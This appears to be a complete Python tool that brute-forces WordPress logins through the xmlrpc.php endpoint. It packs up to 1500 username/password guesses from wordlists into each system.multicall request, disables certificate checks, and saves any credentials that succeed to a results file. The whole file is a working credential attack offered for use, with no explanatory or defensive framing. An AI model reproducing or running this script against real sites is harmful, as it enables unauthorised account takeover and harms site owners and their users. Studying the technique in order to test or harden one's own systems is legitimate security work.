#!/usr/bin/env python3
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def check_response(response, credentials_file):
        pwned = False
        password_index = -1
        error_message_en = "Incorrect"
        error_message_es = "Incorrecto"
        messages_counter = 0
        #Last position is methodResponse, no password data
        responses_to_check = response.text.split("</struct>")[:-1]
        while messages_counter < len(responses_to_check) and not pwned:
                individual_response = responses_to_check[messages_counter]
                if not error_message_en in individual_response and not error_message_es in individual_response:
                        print("\n###\nResponse:\tPotential valid credentials found!\n##\n")
                        print("\tResponse: %s\n##\n" % (individual_response))
                        credentials_file.write(("Response:\n%s\n") % (responses_to_check[messages_counter]))
                        pwned = True
                        password_index = messages_counter
                messages_counter += 1
        return password_index
        
def main(target, wordlist_passwords=None, wordlist_users=None):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        CREDENTIALS_PER_REQUEST = 1500
        RESULTS_FILE = open("XMLRPC_bruteforcer_results.txt", "w")
        PAYLOAD_STARTING = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"""
        PAYLOAD_END = """</data></array></value></param></params></methodCall>"""
        url = target + "/xmlrpc.php"
        if wordlist_users and wordlist_passwords:
                users = open(wordlist_users, "r")
                for org_user in users:
                        main_payload = ""
                        credentials_counter = 0
                        tested_credentials = []
                        passwords = open(wordlist_passwords, "r")
                        for org_password in passwords:
                                user = str(org_user).rstrip()
                                password = str(org_password).rstrip()
                                current_credentials = (user, password)
                                main_payload += """<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>
                                        params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data>
                                        </array></value></data></array></value></member></struct></value>""" % (user, password)
                                tested_credentials.append(current_credentials)
                                credentials_counter += 1
                                if credentials_counter % CREDENTIALS_PER_REQUEST == 0:
                                        payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
                                        request = requests.post(url,data=payload, verify=False)
                                        main_payload = ""
                                        cred_index = check_response(request,RESULTS_FILE)
                                        if cred_index > -1:
                                                print("\t\tCredentials: %s" % ("-".join(tested_credentials[cred_index])))
                                                RESULTS_FILE.write("\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[cred_index])))
                                        else:
                                                print("No credentials found in response")
                                        
                        # Check remaining credentials before trying another user
                        if main_payload != "":
                                payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
                                request = requests.post(url,data=payload, verify=False)
                                cred_index = check_response(request,RESULTS_FILE)
                                if cred_index > -1:
                                        print("\t\tCredentials: %s" % ("-".join(tested_credentials[cred_index])))
                                        RESULTS_FILE.write("\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[cred_index])))
                                else:
                                        print("No credentials found in response")
                
        RESULTS_FILE.close()

if __name__ == "__main__":
        parser = argparse.ArgumentParser(description="Wordpress xml_rpc.php bruteforcer")
        parser.add_argument("-t", "--target_url", type=str, required=True)
        parser.add_argument("-p", "--passwords_dic", type=str, required=True)
        parser.add_argument("-u", "--users_dic", type=str, required=True)
        args = parser.parse_args()
        main(args.target_url, args.passwords_dic, args.users_dic)
        
